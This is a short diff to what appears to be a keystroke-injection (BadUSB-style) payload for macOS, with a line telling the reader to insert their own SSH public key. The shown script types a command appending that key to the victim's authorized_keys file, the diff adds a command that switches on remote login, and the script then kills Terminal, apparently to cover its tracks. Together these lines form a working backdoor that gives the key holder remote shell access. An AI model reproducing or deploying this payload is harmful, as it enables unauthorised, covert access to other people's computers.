@@ -17,6 +17,8 @@ Replace RSA_PUB_ID with your SSH Public Key.
     DELAY 800
     STRING echo 'RSA_PUB_ID' >> ~/.ssh/authorized_keys
     ENTER
+    STRING systemsetup -setremotelogin on
+    ENTER
     DELAY 1000
     STRING killall Terminal
     ENTER
